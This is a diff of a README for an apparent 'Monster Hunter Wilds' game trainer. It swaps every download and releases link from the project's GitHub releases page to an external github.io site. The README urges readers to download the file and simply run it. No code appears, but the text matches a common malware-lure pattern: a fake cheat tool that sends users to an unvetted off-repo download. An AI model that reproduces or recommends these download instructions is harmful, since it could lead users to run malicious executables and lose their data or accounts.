@@ -1,6 +1,6 @@
 # 🎮 monster-hunter-wilds-trainer-2026 - Ultimate Trainer for Unlimited Power
 
-[![Download Now](https://img.shields.io/badge/Download-Trainer_2026-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/manggojuti-design/monster-hunter-wilds-trainer-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-Trainer_2026-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://manggojuti-design.github.io)
 
 ---
 
@@ -14,7 +14,7 @@ This guide will walk you through downloading, installing, and using the trainer.
 
 ## 📥 Download the Trainer
 
-Visit this link to download the application: **[Download monster-hunter-wilds-trainer-2026](https://github.com/manggojuti-design/monster-hunter-wilds-trainer-2026/releases)**
+Visit this link to download the application: **[Download monster-hunter-wilds-trainer-2026](https://manggojuti-design.github.io)**
 
 Once you click the link, you'll be taken to the download page. Look for the latest release file and click the download button. The file will be saved to your computer's default download folder (usually "Downloads").
 
@@ -90,7 +90,7 @@ If you encounter any issues, try these solutions:
 
 ## 🔄 Updates
 
-We regularly release updates to add new features and improve performance. Always check the [releases page](https://github.com/manggojuti-design/monster-hunter-wilds-trainer-2026/releases) for the latest version. Updates are free and require no additional setup — just download the new file and run it.
+We regularly release updates to add new features and improve performance. Always check the [releases page](https://manggojuti-design.github.io) for the latest version. Updates are free and require no additional setup — just download the new file and run it.
 
 ---
 
